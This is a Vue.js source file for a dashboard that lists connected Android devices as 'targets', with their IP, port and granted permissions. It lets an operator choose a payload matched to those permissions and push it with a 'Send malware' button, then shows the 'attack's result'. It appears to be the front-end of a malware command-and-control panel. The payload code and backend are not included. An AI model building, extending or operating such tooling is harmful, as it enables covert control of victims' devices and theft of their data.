<template>
  <mdb-container id="devices">
    <mdb-row class="justify-content-center">
      <h1 class="h1-responsive font-weight-bold text-center my-5">Connected devices</h1>
    </mdb-row>

    <mdb-row class="justify-content-center">
      <mdb-col md="6" class="mb-5" v-for="(target, index) in targets" v-bind:key="index">
        <mdb-card>
          <mdb-card-body class="text-center">
            <img v-bind:src="target.device.deviceImage" v-bind:alt="target.device.model">
            <mdb-card-title><strong>{{ target.device.model }}</strong></mdb-card-title>

            <mdb-card-text>API: {{ target.device.api }}</mdb-card-text>

            <mdb-card-text>{{ target.device.ip }} - {{ target.device.port }}</mdb-card-text>

            <ul class="text-left">
              <li v-for="permission in target.device.permissions" v-bind:key="permission">{{ permission }}
                <i v-if="isInArray(permission, target.device.permissionsGranted)"
                   class="fas fa-check-circle green-icon"></i>
                <i v-else class="fas fa-times-circle red-icon"></i>
              </li>
            </ul>

            <mdb-row class="justify-content-center align-items-center">
              <mdb-col  md="6" class="mb-1">
                <label>Payload:</label>
                <model-list-select :list="filterPayload(payloads, target.device.permissionsGranted)"
                                   v-model="target.payload_id"
                                   option-value="_id"
                                   option-text="name"
                                   placeholder="select payload">
                </model-list-select>
              </mdb-col>

              <mdb-col md="6" class="mb-1 full-input">
                <label for="arg">Arg:</label>
                <input class="text-black" id="arg" type="text" v-model="target.arg">
              </mdb-col>

              <mdb-col md="12" class="mb-1 text-left" v-if="target.payload_id">
                <codemirror class="w-100" v-model="payloads.find(value => value._id===target.payload_id).content" :options="cmOptions"></codemirror>
              </mdb-col>

              <mdb-col md="12" class="mb-1">
                <mdb-btn color="unique-color-dark" class="btn unique-color-dark text-white ripple-parent"
                         v-on:click="send(target.device, target.payload_id, target.arg)">
                  Send malware <i class="fas fa-user-secret"></i>
                </mdb-btn>
              </mdb-col>
            </mdb-row>
          </mdb-card-body>
        </mdb-card>
      </mdb-col>
    </mdb-row>

    <mdb-row class="justify-content-center text-center">
      <mdb-alert v-bind:color="alertColor" v-if="showAlert" @closeAlert="showAlert=false" dismiss>
        {{alertText}}
      </mdb-alert>
    </mdb-row>

    <mdb-row class="justify-content-center text-center">
      <mdb-col>
        <i class="fas fa-biohazard animated rotateIn infinite"></i>
      </mdb-col>
    </mdb-row>
  </mdb-container>
</template>

<script>
import DevicesService from "@/services/DevicesService";

import {ModelListSelect} from 'vue-search-select'
import PayloadsService from "@/services/PayloadsService";

import {mdbAlert, mdbBtn, mdbCard, mdbCardBody, mdbCardText, mdbCardTitle, mdbCol, mdbContainer, mdbRow} from 'mdbvue';

// import codemirror
import 'codemirror/theme/darcula.css'
import 'codemirror/lib/codemirror';

export default {
  name: "Devices",
  components: {
    ModelListSelect,
    mdbContainer,
    mdbRow,
    mdbCol,
    mdbCard,
    mdbCardTitle,
    mdbCardBody,
    mdbCardText,
    mdbBtn,
    mdbAlert
  },
  data() {
    return {
      targets: [],
      payloads: [],
      cmOptions: {
        tabSize: 4,
        mode: 'text/x-java',
        theme: 'darcula',
        lineNumbers: false,
        line: true,
        readOnly: true
      },
      refreshRate: 3000,
      showAlert: false,
      alertColor: "success",
      alertText: "Empty"
    }
  },
  mounted() {
    this.getPayloads();

    this.getDevices();
  },
  methods: {
    async getDevices() {
      const response = await DevicesService.fetchDevices();

      let newTargets = []

      response.data.forEach((device) => {
        newTargets.push({device: device});
      });

      if (newTargets === this.targets) {
        this.refreshRate += this.refreshRate === 10000 ? 0 : 1000;
      } else {
        this.refreshRate -= this.refreshRate === 1000 ? 0 : 1000;
        this.targets = newTargets;
      }
    },
    async getPayloads() {
      const response = await PayloadsService.fetchPayloads();
      this.payloads = response.data;
    },
    async send(device, payload_id, arg) {
      DevicesService.activate(device, payload_id, arg)
          .then((response) => {
            this.showAlert = true;
            this.alertColor = "success";
            this.alertText = "Attack's result: " + response.data.result;
          })
          .catch((error) => {
            this.showAlert = true;
            this.alertColor = "error";
            this.alertText = "Error: " + error;
          });
    },
    filterPayload(payloads, permissionsGranted) {
      let payloadsVulns = [];
      payloads.forEach((payload) => {
        let i = 0;
        while (i < payload.vulnerabilities.length && this.isInArray(payload.vulnerabilities[i], permissionsGranted)) {
          i++;
        }

        if (i >= payload.vulnerabilities.length) {
          payloadsVulns.push(payload)
        }
      });
      return payloadsVulns;
    },
    isInArray(needle, array) {
      let i = 0;
      while (i < array.length && needle !== array[i]) {
        i++;
      }

      return i < array.length;
    }
  }
}
</script>

<style scoped>
.red-icon {
  color: red;
}

.green-icon {
  color: green
}

.text-black{
  color: black !important;
}

.full-input input{
  color:  black !important;
  width: 100%;
}
.full-input label {
  width: 100%;
}

.CodeMirror {
  font-size: 0.8em;
}

.alert {
  width: 80%;
  word-break: break-all;
}
</style>
